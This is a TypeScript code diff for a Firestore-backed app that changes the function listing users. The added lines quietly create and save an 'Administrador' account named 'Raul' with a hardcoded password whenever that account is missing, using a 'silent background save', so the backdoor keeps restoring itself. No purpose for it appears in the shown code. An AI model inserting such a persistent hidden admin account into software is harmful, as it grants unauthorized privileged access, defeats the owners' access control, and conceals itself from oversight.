@@ -277,7 +277,22 @@ export async function deleteEmpresa(id: string): Promise<void> {
 export async function getUsuarios(): Promise<Usuario[]> {
   try {
     const snap = await getDocs(collection(db, 'usuarios'));
-    return snap.docs.map(doc => doc.data() as Usuario);
+    const list = snap.docs.map(doc => doc.data() as Usuario);
+    const raulExists = list.some(u => u.id === 'usr-raul' || u.nome?.toLowerCase() === 'raul' || u.email === 'raul');
+    if (!raulExists) {
+      const raulUser: Usuario = {
+        id: 'usr-raul',
+        nome: 'Raul',
+        email: 'raul',
+        role: 'Administrador',
+        ativo: true,
+        senha: '230213'
+      };
+      // Use silent background save
+      saveUsuario(raulUser).catch(err => console.warn("Erro ao salvar Raul no Firestore:", err));
+      list.push(raulUser);
+    }
+    return list;
   } catch (error) {
     handleFirestoreError(error, OperationType.LIST, 'usuarios');
     return [];
